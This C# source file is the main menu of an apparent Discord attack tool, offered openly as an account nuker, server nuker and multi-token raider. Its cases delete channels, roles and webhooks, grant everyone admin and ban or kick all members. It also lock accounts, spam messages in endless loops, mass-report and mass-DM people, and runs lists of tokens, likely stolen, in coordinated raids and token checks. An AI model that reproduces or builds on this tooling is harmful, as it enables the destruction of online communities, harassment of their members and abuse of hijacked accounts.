﻿using Solaris.API.Internals.Modules.Account;
using Solaris.API.Internals.Utils;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using Console = Colorful.Console;

namespace Solaris.API.Internals.Menues
{
    public static class MainMewn
    {
        public static void Show()
        {
            try
            {
                Console.ForegroundColor = Color.GhostWhite;
                Asci.Draw();
                Console.WriteLine("╔════════════════════════╦════════════════════════════════════════════════════════════╦══════════════════════╗\r\n║ > Account Nuker        ║ > Server Nuker                                             ║ > Multi-token Raider ║\r\n╠══╦═════════════════════╬══╦══════════════════════╦══╦═══════════════════════════════╬══╦═══════════════════╣\r\n║01║ Edit Profile        ║15║ Delete All Roles     ║29║ Delete Stickers               ║43║ Join Group        ║\r\n║02║ Leave/Delete Guilds ║16║ Remove All Bans      ║30║ Grant Everyone Admin          ║44║ Leave Guild       ║\r\n║03║ Clear Relationships ║17║ Delete All Channels  ║31║ Delete Auto Moderation Rules  ║45║ Spam              ║\r\n║04║ Leave HypeSquad     ║18║ Delete All Emojis    ║32║ Mass Create Invites           ║46║ Add Reaction      ║\r\n║05║ Remove Connections  ║19║ Delete All Invites   ║33║ Delete Guild Scheduled Events ║47║ DM User           ║\r\n║06║ Deauthorize Apps    ║20║ Mass Create Roles    ║34║ Delete Guild Template         ║48║ Leave Group       ║\r\n║07║ Seizure Mode        ║21║ Mass Create Channels ║35║ Delete Stage Instances        ║49║ Trigger Typing    ║\r\n║08║ Confuse Mode        ║22║ Prune Members        ║36║ Delete All Webhooks           ║50║ Report Message    ║\r\n║09║ Mass DM             ║23║ Remove Integrations  ║37║ Webhook Spammer               ║51║ Boost Server      ║\r\n║10║ User Info           ║24║ Remove All Reactions ║38║ Mass Report                   ║52║ Check Tokens      ║\r\n║11║ Delete DMs          ║25║ Guild Info           ║39║ Ban All Members               ║53║ Online Tokens     ║\r\n║12║ Lock Account        ║26║ Leave/Delete Guild   ║40║ Kick All Members              ║54║ Join Voice Chat   ║\r\n║13║ Login To Account    ║27║ Msg In Every Channel ║41║ Rename Everyone               ║55║ Exit              ║");
                Console.ForegroundColor = Color.GhostWhite;
                Console.WriteLine();
                Console.Write("Your choice: ");
                switch (int.Parse(Console.ReadLine()))
                {
                    case 1:
                        Validator.Token();
                        EditProfile.Show();
                        break;

                    case 2:
                        Validator.Token();
                        Asci.Draw();
                        User.LeaveDeleteGuilds(Program.token);
                        Show();
                        break;

                    case 3:
                        Validator.Token();
                        Asci.Draw();
                        User.ClearRelationships(Program.token);
                        Show();
                        break;

                    case 4:
                        Validator.Token();
                        Asci.Draw();
                        User.LeaveHypeSquad(Program.token);
                        Show();
                        break;

                    case 5:
                        Validator.Token();
                        Asci.Draw();
                        User.RemoveConnections(Program.token);
                        Show();
                        break;

                    case 6:
                        Validator.Token();
                        Asci.Draw();
                        User.DeauthorizeApps(Program.token);
                        Show();
                        break;

                    case 7:
                        Validator.Token();
                        Asci.Draw();
                        Task.Run(SeizureMode.Start);
                        Show();
                        break;

                    case 8:
                        Validator.Token();
                        Asci.Draw();
                        User.ConfuseMode(Program.token);
                        Show();
                        break;

                    case 9:
                        Validator.Token();
                        Asci.Draw();
                        Console.Write("Message: ");
                        Asci.Draw();
                        User.MassDM(Program.token, Console.ReadLine());
                        Show();
                        break;

                    case 10:
                        Validator.Token();
                        Asci.Draw();
                        User.UserInformation(Program.token);
                        Show();
                        break;

                    case 11:
                        Validator.Token();
                        Asci.Draw();
                        User.DeleteDMs(Program.token);
                        Show();
                        break;

                    case 12:
                        Validator.Token();
                        Asci.Draw();
                        Console.ForegroundColor = Color.GhostWhite;
                        Console.Write("This option puts the \"Verification Required\" lock on the account if the user hasn't added a phone number to their account.\n\nPress any key to continue.");
                        Console.ReadKey();
                        User.LockAccount(Program.token);
                        Show();
                        break;

                    case 13:
                        Validator.Token();
                        Asci.Draw();
                        Program.LoginToAccount();
                        Show();
                        break;

                    case 14:
                        Asci.Draw();
                        Console.Write("Token: ");
                        Program.token = Console.ReadLine();
                        Show();
                        break;

                    case 15:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.DeleteRoles(Program.token, Program.guildid);
                        Show();
                        break;

                    case 16:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.RemoveBans(Program.token, Program.guildid);
                        Show();
                        break;

                    case 17:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.DeleteChannels(Program.token, Program.guildid);
                        Show();
                        break;

                    case 18:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.DeleteEmojis(Program.token, Program.guildid);
                        Show();
                        break;

                    case 19:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.DeleteInvites(Program.token, Program.guildid);
                        Show();
                        break;

                    case 20:
                        Validator.GuildID();
                        Asci.Draw();
                        Console.Write("Role name (leave blank for random): ");
                        string name1 = Console.ReadLine();
                        if (string.IsNullOrEmpty(name1))
                        {
                            name1 = "øæåäöüéíóúüñçčćđšžàèąęėįšųūøßłțșîâăơưãѩѭѧѫѱѯюыщчв的我ㄱㄴㄷ";
                        }

                        Asci.Draw();
                        Console.Write("Count (max 250): ");
                        int num1 = int.Parse(Console.ReadLine());
                        Asci.Draw();
                        int num2 = 0;
                        for (int index = 0; index < num1; ++index)
                        {
                            ++num2;
                            Guild.CreateRole(Program.token, Program.guildid, name1);
                            Console.ReplaceAllColorsWithDefaults();
                            Console.WriteLine($"Created: {num2}", Color.Lime);
                        }
                        Show();
                        break;

                    case 21:
                        Validator.GuildID();
                        Asci.Draw();
                        Console.Write("Channel name (leave blank for random): ");
                        string name2 = Console.ReadLine();
                        if (string.IsNullOrEmpty(name2))
                        {
                            name2 = "øæåäöüéíóúüñçčćđšžàèąęėįšųūøßłțșîâăơưãѩѭѧѫѱѯюыщчв的我ㄱㄴㄷ";
                        }

                        Asci.Draw();
                        Console.Write("Count (max 500): ");
                        int num3 = int.Parse(Console.ReadLine());
                        Asci.Draw();
                        int num4 = 0;
                        for (int index = 0; index < num3; ++index)
                        {
                            ++num4;
                            Guild.CreateChannel(Program.token, Program.guildid, name2);
                            Console.ReplaceAllColorsWithDefaults();
                            Console.WriteLine($"Created: {num4}", Color.Lime);
                        }
                        Show();
                        break;

                    case 22:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.PruneMembers(Program.token, Program.guildid);
                        Show();
                        break;

                    case 23:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.RemoveIntegrations(Program.token, Program.guildid);
                        Show();
                        break;

                    case 24:
                        Validator.GuildID();
                        Asci.Draw();
                        Console.Write("Channel ID: ");
                        ulong? cid1 = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        Console.Write("Message ID: ");
                        ulong? mid1 = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        Guild.DeleteAllReactions(Program.token, cid1, mid1);
                        Show();
                        break;

                    case 25:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.GuildInformation(Program.token, Program.guildid);
                        Show();
                        break;

                    case 26:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.LeaveDeleteGuild(Program.token, Program.guildid);
                        Show();
                        break;

                    case 27:
                        Validator.GuildID();
                        Asci.Draw();
                        Console.ForegroundColor = Color.GhostWhite;
                        Console.Write("\r\n╔══╦═════════════╗\r\n║##║ Name        ║\r\n╠══╬═════════════╣\r\n║01║ Spam        ║\r\n║02║ One Message ║\r\n╚══╩═════════════╝\r\n");
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        switch (int.Parse(Console.ReadLine()))
                        {
                            case 1:
                                Asci.Draw();
                                Console.Write("Message: ");
                                string msg3_1 = Console.ReadLine();
                                Asci.Draw();
                                Task.Run(() =>
                                {
                                    while (true)
                                    {
                                        try
                                        {
                                            Guild.MsgInEveryChannel(Program.token, Program.guildid, msg3_1);
                                        }
                                        catch
                                        {
                                        }
                                    }
                                });
                                break;

                            case 2:
                                Asci.Draw();
                                Console.Write("Message: ");
                                string message3 = Console.ReadLine();
                                Asci.Draw();
                                Guild.MsgInEveryChannel(Program.token, Program.guildid, message3);
                                break;
                        }
                        Show();
                        break;

                    case 28:
                        Validator.GuildID();
                        Asci.Draw();
                        Console.Write("Webhook URL/ID: ");
                        ulong? wid = new ulong?(ulong.Parse(Console.ReadLine().Replace("https://discord.com/api/webhooks/", "").Split('/')[0]));
                        Asci.Draw();
                        Guild.DeleteWebhook(Program.token, wid);
                        Console.WriteLine("Done");
                        Show();
                        break;

                    case 29:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.DeleteStickers(Program.token, Program.guildid);
                        Show();
                        break;

                    case 30:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.GrantEveryoneAdmin(Program.token, Program.guildid);
                        Show();
                        break;

                    case 31:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.DeleteAutoModerationRules(Program.token, Program.guildid);
                        Show();
                        break;

                    case 32:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.CreateInvite(Program.token, Program.guildid);
                        Show();
                        break;

                    case 33:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.DeleteGuildScheduledEvents(Program.token, Program.guildid);
                        Show();
                        break;

                    case 34:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.DeleteGuildTemplate(Program.token, Program.guildid);
                        Show();
                        break;

                    case 35:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.DeleteStageInstances(Program.token, Program.guildid);
                        Show();
                        break;

                    case 36:
                        Validator.GuildID();
                        Asci.Draw();
                        Guild.DeleteWebhooks(Program.token, Program.guildid);
                        Show();
                        break;

                    case 37:
                        Validator.GuildID();
                        Asci.Draw();
                        Console.Write("Webhook URL: ");
                        string str1 = Console.ReadLine();
                        Asci.Draw();
                        Console.Write("Message: ");
                        string message2 = Console.ReadLine();
                        Asci.Draw();
                        Console.Write("Count: ");
                        int mcount = int.Parse(Console.ReadLine());
                        Asci.Draw();
                        string str2 = str1.Replace("https://discord.com/api/webhooks/", "");
                        ulong? wid2 = new ulong?(ulong.Parse(str2.Split('/')[0]));
                        string wtoken = str2.Split('/')[1];
                        Task.Run(() =>
                        {
                            for (int index = 0; index < mcount; ++index)
                            {
                                try
                                {
                                    Guild.SendWebhookMessage(Program.token, wid2, wtoken, message2);
                                }
                                catch
                                {
                                }
                            }
                        });
                        Show();
                        break;

                    case 38:
                        Validator.GuildID();
                        Asci.Draw();
                        Console.Write("Guild ID: ");
                        ulong? gid1 = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        Console.Write("Channel ID: ");
                        ulong? cid2 = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        Console.Write("Message ID: ");
                        ulong? mid2 = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        Console.ForegroundColor = Color.GhostWhite;
                        Console.Write("\r\n╔══╦════════════════════════╗\r\n║##║ Name                   ║\r\n╠══╬════════════════════════╣\r\n║01║ Illegal Content        ║\r\n║02║ Harrassment            ║\r\n║03║ Spam Or Phishing Links ║\r\n║04║ Self Harm              ║\r\n║05║ NSFW                   ║\r\n╚══╩════════════════════════╝\r\n");
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        int reason1 = int.Parse(Console.ReadLine());
                        Asci.Draw();
                        Console.Write("Reports count: ");
                        int num5 = int.Parse(Console.ReadLine());
                        Asci.Draw();
                        int num6 = 0;
                        for (int index = 0; index < num5; ++index)
                        {
                            Guild.ReportMessage(Program.token, gid1, cid2, mid2, reason1);
                            ++num6;
                            Console.WriteLine($"Reports sent: {num6}");
                        }
                        Show();
                        break;

                    case 39:
                        Validator.GuildID();
                        Asci.Draw();
                        if (Config.IsBot)
                        {
                            Bot.BanAllMembers(Program.token, Program.guildid);
                        }
                        else
                        {
                            Console.WriteLine("To use this feature, you must use a bot token.");
                            Config.Sleep(Config.Wait.Long);
                        }
                        Show();
                        break;

                    case 40:
                        Validator.GuildID();
                        Asci.Draw();
                        if (Config.IsBot)
                        {
                            Bot.KickAllMembers(Program.token, Program.guildid);
                        }
                        else
                        {
                            Console.WriteLine("To use this feature, you must use a bot token.");
                            Config.Sleep(Config.Wait.Long);
                        }
                        Show();
                        break;

                    case 41:
                        Validator.GuildID();
                        Asci.Draw();
                        if (Config.IsBot)
                        {
                            Console.Write("Nickname (leave blank for random): ");
                            string nick = Console.ReadLine();
                            if (string.IsNullOrEmpty(nick))
                            {
                                nick = "øæåäöüéíóúüñçčćđšžàèąęėįšųūøßłțșîâăơưãѩѭѧѫѱѯюыщчв的我ㄱㄴㄷ";
                            }

                            Asci.Draw();
                            Bot.ChangeAllNicknames(Program.token, Program.guildid, nick);
                        }
                        else
                        {
                            Console.WriteLine("To use this feature, you must use a bot token.");
                            Config.Sleep(Config.Wait.Long);
                        }
                        Show();
                        break;

                    case 42:
                        Asci.Draw();
                        Console.Write("Guild ID: ");
                        Program.guildid = new ulong?(ulong.Parse(Console.ReadLine()));
                        Show();
                        break;

                    case 43:
                        Validator.MultiTokens();
                        Asci.Draw();
                        Console.Write("Invite code: ");
                        string code = Console.ReadLine();
                        if (code.Contains("https://discord.gg/"))
                        {
                            code = code.Replace("https://discord.gg/", "");
                        }

                        if (code.Contains("https://discord.com/invite/"))
                        {
                            code = code.Replace("https://discord.com/invite/", "");
                        }

                        Asci.Draw();
                        foreach (string token in Program.tokenlist)
                        {
                            Raid.JoinGroup(token, code);
                        }

                        Show();
                        break;

                    case 44:
                        Validator.MultiTokens();
                        Asci.Draw();
                        Console.Write("Guild ID: ");
                        ulong? id = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        foreach (string token in Program.tokenlist)
                        {
                            Raid.LeaveGuild(token, id);
                        }

                        Show();
                        break;

                    case 45:
                        Validator.MultiTokens();
                        Asci.Draw();
                        Console.ForegroundColor = Color.GhostWhite;
                        Console.Write("\r\n╔══╦═════════════╗\r\n║##║ Name        ║\r\n╠══╬═════════════╣\r\n║01║ Spam        ║\r\n║02║ One Message ║\r\n╚══╩═════════════╝\r\n");
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        switch (int.Parse(Console.ReadLine()))
                        {
                            case 1:
                                Asci.Draw();
                                Console.Write("Channel ID: ");
                                ulong? cid3 = new ulong?(ulong.Parse(Console.ReadLine()));
                                Asci.Draw();
                                Console.Write("Message: ");
                                string msg = Console.ReadLine();
                                Asci.Draw();
                                Task.Run(() =>
                                {
                                label_0:
                                    try
                                    {
                                        using (var enumerator = Program.tokenlist.GetEnumerator())
                                        {
                                            while (enumerator.MoveNext())
                                            {
                                                Raid.SendMessage(enumerator.Current, cid3, msg);
                                            }

                                            goto label_0;
                                        }
                                    }
                                    catch
                                    {
                                    }
                                });
                                break;

                            case 2:
                                Asci.Draw();
                                Console.Write("Channel ID: ");
                                ulong? cid7 = new ulong?(ulong.Parse(Console.ReadLine()));
                                Asci.Draw();
                                Console.Write("Message: ");
                                string msg3_2 = Console.ReadLine();
                                Asci.Draw();
                                Task.Run(() =>
                                {
                                    try
                                    {
                                        foreach (string token in Program.tokenlist)
                                        {
                                            Raid.SendMessage(token, cid7, msg3_2);
                                        }
                                    }
                                    catch
                                    {
                                    }
                                });
                                break;
                        }
                        Show();
                        break;

                    case 46:
                        Validator.MultiTokens();
                        Asci.Draw();
                        Console.Write("Channel ID: ");
                        ulong? cid4 = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        Console.Write("Message ID: ");
                        ulong? mid3 = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        Dictionary<int, string> dictionary = new Dictionary<int, string>()
                        {
                            {1,"❤️"},
                            {2,"✅"},
                            {3,"\uD83C\uDDF1"},
                            {4,"\uD83C\uDDFC"},
                            {5,"\uD83D\uDD95"},
                            {6,"\uD83E\uDDE2"},
                            {7,"❎"},
                            {8,"\uD83D\uDE10"},
                            {9,"\uD83E\uDD13"},
                            {10,"\uD83D\uDE02"},
                            {11,"\uD83D\uDC80"},
                            {12,"\uD83E\uDD21"},
                            {13,"\uD83D\uDE36"},
                            {14,"\uD83D\uDE2D"}
                        };
                        Console.ForegroundColor = Color.GhostWhite;
                        Console.Write("\r\n╔══╦═══════════════════════════════════════════════════════════════════════════════════╗\r\n║##║ Name                                                                              ║\r\n╠══╬══════════════════════╦══╦═════════════════════════════╦══╦════════════════════════╣\r\n║01║ Heart                ║06║ Billed Cap                  ║11║ Skull                  ║\r\n║02║ White Check Mark     ║07║ Negative Squared Cross Mark ║12║ Clown                  ║\r\n║03║ Regional Indicator L ║08║ Neutral Face                ║13║ No Mouth               ║\r\n║04║ Regional Indicator W ║09║ Nerd Face                   ║14║ Sob                    ║\r\n║05║ Middle Finger        ║10║ Joy                         ║15║ Add other/custom emoji ║\r\n╚══╩══════════════════════╩══╩═════════════════════════════╩══╩════════════════════════╝\r\n");
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        int key = int.Parse(Console.ReadLine());
                        Asci.Draw();
                        if (dictionary.ContainsKey(key))
                        {
                            foreach (string token in Program.tokenlist)
                            {
                                Raid.AddReaction(token, cid4, mid3, dictionary[key]);
                            }
                        }
                        else if (key == 15)
                        {
                            Asci.Draw();
                            Console.ForegroundColor = Color.Yellow;
                            Console.Write("\r\nTo add any other Discord emoji:\r\n1. In a Discord server, enter the desired emoji like :thumbsup: (replace \"thumbsup\" with any emoji of your choice) and copy the emoji.\r\n2. Go to urlencoder.org, paste the copied emoji in the first text box and click the \"ENCODE\" button.\r\n3. Paste the result below. (It should look like %F0%9F%91%8D, which represents the thumbs up emoji)\r\n\r\nTo add any custom emoji:\r\n1. In a Discord server, enter the desired custom emoji like \\:customimage: (replace \"customimage\" with any custom emoji of your choice) and send the message.\r\n2. The result will look like <:customimage:1071451591124721684>, copy the text without the angle brackets (i.e. :customimage:1071451591124721684).\r\n3. Paste the copied text below.\r\n");
                            Console.WriteLine();
                            Console.Write("Your choice: ");
                            string emoji = Console.ReadLine();
                            Asci.Draw();
                            foreach (string token in Program.tokenlist)
                            {
                                Raid.AddReaction(token, cid4, mid3, emoji);
                            }
                        }
                        Show();
                        break;

                    case 47:
                        Validator.MultiTokens();
                        Asci.Draw();
                        Console.Write("User Channel ID: ");
                        ulong? cid5 = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        Console.Write("Message: ");
                        string message4 = Console.ReadLine();
                        Asci.Draw();
                        foreach (string token in Program.tokenlist)
                        {
                            Raid.DMUser(token, cid5, message4);
                        }

                        Show();
                        break;

                    case 48:
                        Validator.MultiTokens();
                        Asci.Draw();
                        Console.Write("Group ID: ");
                        ulong? gid2 = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        foreach (string token in Program.tokenlist)
                        {
                            Raid.LeaveGroup(token, gid2);
                        }

                        Show();
                        break;

                    case 49:
                        Validator.MultiTokens();
                        Asci.Draw();
                        Console.Write("Channel ID: ");
                        ulong? cid6 = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        foreach (string token in Program.tokenlist)
                        {
                            Raid.TriggerTyping(token, cid6);
                        }

                        Show();
                        break;

                    case 50:
                        Validator.MultiTokens();
                        Asci.Draw();
                        Console.Write("Guild ID: ");
                        ulong? gid3 = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        Console.Write("Channel ID: ");
                        ulong? cid8 = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        Console.Write("Message ID: ");
                        ulong? mid4 = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        Console.ForegroundColor = Color.GhostWhite;
                        Console.Write("\r\n╔══╦════════════════════════╗\r\n║##║ Name                   ║\r\n╠══╬════════════════════════╣\r\n║01║ Illegal Content        ║\r\n║02║ Harrassment            ║\r\n║03║ Spam Or Phishing Links ║\r\n║04║ Self Harm              ║\r\n║05║ NSFW                   ║\r\n╚══╩════════════════════════╝\r\n");
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        int reason2 = int.Parse(Console.ReadLine());
                        Asci.Draw();
                        foreach (string token in Program.tokenlist)
                        {
                            Raid.ReportMessage(token, gid3, cid8, mid4, reason2);
                        }

                        Show();
                        break;

                    case 51:
                        Validator.MultiTokens();
                        Asci.Draw();
                        Console.Write("Guild ID: ");
                        ulong? gid4 = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        foreach (string token in Program.tokenlist)
                        {
                            Raid.Boost(token, gid4);
                        }

                        Show();
                        break;

                    case 52:
                        Asci.Draw();
                        Console.ReplaceAllColorsWithDefaults();
                        if (File.Exists("WorkingTokens.txt"))
                        {
                            File.Delete("WorkingTokens.txt");
                        }

                        foreach (string readAllLine in File.ReadAllLines("multitokens.txt"))
                        {
                            try
                            {
                                Request.Send("/users/@me", "GET", readAllLine);
                                Console.WriteLine(readAllLine, Color.Lime);
                                File.AppendAllText("WorkingTokens.txt", $"{readAllLine}{Environment.NewLine}");
                            }
                            catch
                            {
                                Console.WriteLine(readAllLine, Color.Red);
                            }
                            Config.Sleep(Config.Wait.Short);
                        }
                        Console.ForegroundColor = Color.GhostWhite;
                        Console.WriteLine("Working tokens were saved to WorkingTokens.txt");
                        Config.Sleep(Config.Wait.Long);
                        Show();
                        break;

                    case 53:
                        Validator.MultiTokens();
                        Asci.Draw();
                        Task.Run(() =>
                        {
                            try
                            {
                                foreach (string token in Program.tokenlist)
                                {
                                    Raid.OnlineTokens(token);
                                }
                            }
                            catch
                            {
                            }
                        });
                        Show();
                        break;

                    case 54:
                        Validator.MultiTokens();
                        Asci.Draw();
                        Console.Write("Guild ID: ");
                        ulong? gid5 = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        Console.Write("Voice Channel ID: ");
                        ulong? vid = new ulong?(ulong.Parse(Console.ReadLine()));
                        Asci.Draw();
                        Task.Run(() =>
                        {
                            try
                            {
                                foreach (string token in Program.tokenlist)
                                {
                                    Raid.JoinVC(token, gid5, vid);
                                }
                            }
                            catch
                            {
                            }
                        });
                        Show();
                        break;

                    case 55:
                        foreach (Process process in Process.GetProcessesByName("chromedriver"))
                        {
                            process.Kill();
                        }

                        Environment.Exit(0);
                        break;

                    case 56:
                        Asci.Draw();
                        Show();
                        break;

                    default:
                        Console.WriteLine("Not a valid option.");
                        Config.Sleep(Config.Wait.Long);
                        Show();
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Config.Sleep(Config.Wait.Long);
                Show();
            }
        }
    }
}